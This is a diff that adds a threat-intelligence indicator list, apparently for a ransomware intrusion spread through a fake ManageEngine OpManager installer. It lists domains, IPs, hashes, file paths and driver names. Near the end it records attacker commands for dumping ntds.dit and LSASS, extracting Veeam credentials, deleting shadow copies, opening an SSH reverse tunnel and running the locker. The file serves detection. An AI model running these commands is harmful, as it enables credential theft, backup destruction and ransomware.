@@ -1,0 +1,79 @@
+opmanager.pro
+download-center.online
+ip-scanner.org
+soft-hub.pro
+ev2sirbd269o5j.org
+2rxyt8yrhq0bgj.org
+d1hmxkpwby0d4s.org
+yj6jurm5qqkye5.org
+ewujsfb1dp5ran.org
+8doj8uvx604eck.org
+kwywztxoo2xdot.org
+ky1d1p1daahe5t.org
+ovh1kn1tcqw5kp.org
+6cimu4mc085em8.org
+5ka8rxp6t6eup2.org
+ks501oz9nm3v05.org
+v5rjsdqogstopr.org
+192.121.22.94
+109.205.195.211
+188.40.187.145
+171.22.183.43
+194.127.178.21
+172.96.137.160
+193.242.184.150
+185.174.100.203
+170.130.55.223
+83.229.17.60
+124a48b78060fa851e1cc077ca35713c
+ca8646dfc88423bb9fffda811160cebe
+8c113b3aa82c81eee7c6b4ed0ba9a90f
+ab82bf27132323861810c0efcac6d5dd01600dd4
+febbaf5f08a8e0782ffcce8beef1f2b4e249a52b
+d66944e1a57daf04d3e809f22cd01946d593acaf
+186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da
+a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331
+de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d
+ManageEngine-OpManager.msi
+msimg32.dll
+consent.exe
+AdgNsy.exe
+locker.exe
+win.exe
+nudwee.exe
+n.exe
+FileZilla_3.68.1_win64_sponsored2-setup.exe
+1.ps1
+hasherezade_pussy.dll
+%TEMP%\ApplicationInstallationFolder_11\consent.exe
+%TEMP%\ApplicationInstallationFolder_11\msimg32.dll
+%TEMP%\ApplicationInstallationFolder_11\ManageEngine_OpManager_64bit.exe
+C:\ProgramData\locker.exe
+C:\ProgramData\win.exe
+C:\ProgramData\FileZilla_3.68.1_win64_sponsored2-setup.exe
+C:\ProgramData\shares.txt
+C:\ProgramData\AdComputers.csv
+C:\ProgramData\AdUsers.csv
+C:\ProgramData\spn.txt
+C:\Windows\Temp\G7wO.sys
+C:\Windows\Temp\U8Vfsh.docx
+C:\Windows\Temp\AsaZQZDJz.avhdx
+C:\ProgramData\av_kill_new\icardagt\icardagt.exe
+C:\ProgramData\av_kill_old\mfpmp\mfpmp.exe
+backup_DA
+backup_EA
+mgdsrv
+KMHLPSVC
+rwdrv.sys
+hlpdrv.sys
+wbadmin start backup -backuptarget:\\127.0.0.1\C$\ProgramData\ -include:C:\windows\NTDS\ntds.dit
+psql.exe -U postgres --csv -d VeeamBackup -w -c "SELECT user_name,password,description,change_time_utc FROM credentials"
+rundll32.exe C:\windows\System32\comsvcs.dll MiniDump
+powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"
+ssh root@193.242.184.150 -R *:10400 -p22
+locker.exe -p=G:\ -n=15
+win.exe -n=2 netonly
+RustDesk.exe --tray
+Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\programdata\shares.txt
+CmD.eXe
+pOWerShELl.exE
